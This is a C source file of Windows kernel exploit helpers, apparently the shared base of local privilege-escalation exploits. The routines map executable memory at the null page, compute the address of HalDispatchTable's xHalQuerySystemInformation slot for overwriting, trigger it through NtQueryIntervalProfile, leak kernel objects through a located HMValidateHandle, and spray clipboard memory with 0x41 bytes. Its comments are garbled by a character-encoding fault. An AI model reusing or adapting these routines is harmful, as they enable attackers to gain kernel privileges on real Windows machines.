#include "base.h"

void ShowError(char *msg, DWORD dwErrorCode)
{
	printf("%s Error 0x%X\n", msg, dwErrorCode);
}

BOOL AllocateZeroMemory()
{
	NTSTATUS status = STATUS_SUCCESS;
	PVOID pZeroAddress = NULL;
	DWORD dwZeroSize = PAGE_SIZE;
	BOOL bRet = TRUE;

	// ���0��ַ���ڴ�
	pZeroAddress = (PVOID)sizeof(ULONG);
	status = NtAllocateVirtualMemory(NtCurrentProcess(),
									 &pZeroAddress,
									 0,
									 &dwZeroSize,
									 MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
									 PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		ShowError("NtAllocateVirtualMemory", status);
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory((PVOID)0, dwZeroSize);
exit:
	return bRet;
}

PVOID GetHalQuerySystemInformation()
{
	NTSTATUS status = STATUS_SUCCESS;
	DWORD dwReturnLength = 0;
	PSYSTEM_MODULE_INFORMATION pModuleInformation = NULL;
	DWORD dwImageBase = 0;
	PVOID pMappedBase = NULL;
	UCHAR szImageName[KERNEL_NAME_LENGTH] = { 0 };
	UNICODE_STRING uDllName;
	PVOID pHalDispatchTable = NULL, pXHalQuerySystemInformation = NULL;
	DWORD dwDllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;


	// ��ʱdwReturnLength��0�����Ժ��������ڳ���Ϊ0ִ��ʧ��
	// Ȼ��ϵͳ���ڵ��ĸ�����ָ���ĵ�ַ������Ҫ���ڴ��С
	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
		                              &dwReturnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// ��ҳ��С����
	dwReturnLength = (dwReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
	pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL,
																  dwReturnLength,
																  MEM_COMMIT | MEM_RESERVE,
																  PAGE_READWRITE);
	if (!pModuleInformation)
	{
		ShowError("VirtualAlloc", GetLastError());
		goto exit;
	}

	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
									  &dwReturnLength);
	if (!NT_SUCCESS(status))
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// ģ����صĻ���ַ
	dwImageBase = (DWORD)(pModuleInformation->Module[0].Base);

	// ��ȡģ����
	RtlMoveMemory(szImageName,
				  (PVOID)(pModuleInformation->Module[0].ImageName + 
			      pModuleInformation->Module[0].PathLength),
				  KERNEL_NAME_LENGTH);

	// ת��ΪUNICODE_STRING����
	RtlCreateUnicodeStringFromAsciiz(&uDllName, (PUCHAR)szImageName);

	status = (NTSTATUS)LdrLoadDll(NULL,
								  &dwDllCharacteristics,
								  &uDllName,
								  &pMappedBase);

	if (!NT_SUCCESS(status))
	{
		ShowError("LdrLoadDll", status);
		goto exit;
	}

	// ��ȡ�ں�HalDispatchTable�������ַ
	pHalDispatchTable = GetProcAddress((HMODULE)pMappedBase, "HalDispatchTable");

	if (pHalDispatchTable == NULL)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	pHalDispatchTable = (PVOID)((DWORD)pHalDispatchTable - (DWORD)pMappedBase + dwImageBase);
	pXHalQuerySystemInformation = (PVOID)((DWORD)pHalDispatchTable + sizeof(ULONG));

exit:
	if (pModuleInformation)
	{
		VirtualFree(pModuleInformation,
					dwReturnLength,
					MEM_DECOMMIT | MEM_RELEASE);
	}

	if (pMappedBase)
	{
		LdrUnloadDll(pMappedBase);
	}

	return pXHalQuerySystemInformation;
}

BOOL CallNtQueryIntervalProfile()
{
	BOOL bRet = TRUE;
	NTSTATUS status = STATUS_SUCCESS;
	HMODULE hDll = NULL;

	hDll = LoadLibrary("ntdll.dll");
	if (!hDll)
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	lpfnNtQueryIntervalProfile MyNtQueryIntervalProfile = (lpfnNtQueryIntervalProfile)GetProcAddress(hDll, "NtQueryIntervalProfile");

	if (!MyNtQueryIntervalProfile)
	{
		bRet = FALSE;
		ShowError("MyNtQueryIntervalProfile", GetLastError());
		goto exit;
	}

	DWORD dwRet = 0;
	status = MyNtQueryIntervalProfile(ProfileTotalIssues, &dwRet);
	if (!NT_SUCCESS(status))
	{
		ShowError("NtQueryIntervalProfile", status);
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

PVOID GetHMValidateHandle()
{
	PVOID pFuncAddr = NULL;
	HMODULE hUser32 = NULL;
	PBYTE pIsMenu = NULL;
	DWORD i = 0, dwFuncOffset = 0;

	hUser32 = LoadLibraryA("user32.dll");
	if (!hUser32)
	{
		ShowError("LoadLibraryA", GetLastError());
		goto exit;
	}

	pIsMenu = (PBYTE)GetProcAddress(hUser32, "IsMenu");
	if (!pIsMenu)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	for (i = 0; i < PAGE_SIZE; i++)
	{
		if (pIsMenu[i] == 0xE8)
		{
			dwFuncOffset = *PDWORD(pIsMenu + i + 1);
			pFuncAddr = (PVOID)(dwFuncOffset + pIsMenu + i + 5);
			break;
		}
	}

exit:
	return pFuncAddr;
}

BOOL CreateClipboard(DWORD dwSize)
{
	BOOL bRet = TRUE;
	PCHAR pBuffer = NULL;
	HGLOBAL hMem = NULL;

	pBuffer = (PCHAR)malloc(dwSize);
	if (!pBuffer)
	{
		ShowError("malloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory(pBuffer, dwSize);
	FillMemory(pBuffer, dwSize, 0x41);

	hMem = GlobalAlloc(GMEM_MOVEABLE, dwSize);
	if (hMem == NULL)
	{
		ShowError("GlobalAlloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	CopyMemory(GlobalLock(hMem), pBuffer, dwSize);

	GlobalUnlock(hMem);

	SetClipboardData(CF_TEXT, hMem);
exit:
	return bRet;
}